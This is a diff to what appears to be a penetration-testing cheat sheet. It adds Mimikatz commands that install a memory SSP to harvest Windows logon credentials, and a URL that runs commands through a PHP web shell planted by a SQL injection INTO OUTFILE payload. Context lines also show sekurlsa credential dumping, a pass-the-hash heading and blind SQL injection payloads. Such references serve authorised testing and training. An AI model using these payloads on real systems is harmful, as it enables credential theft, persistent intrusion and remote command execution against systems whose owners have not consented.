@@ -525,6 +525,11 @@ privilege::debug
 token::elevate
 sekurlsa::msv 
 ```
+#### Domain for SSP if Windows Guard enabled
+```
+privilege::debug
+misc::memssp
+```
 #### NTLM Pass the hash attack
 Gaining reverse shell
 ```
@@ -965,6 +970,7 @@ Write a WebShell To Disk via INTO OUTFILE directive
 ```
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ```
+http://192.168.129.19/tmp/webshell.php?cmd=id
 ### Blind SQLi
 ```sql
 ' AND IF (1=1, sleep(3),'false') -- //
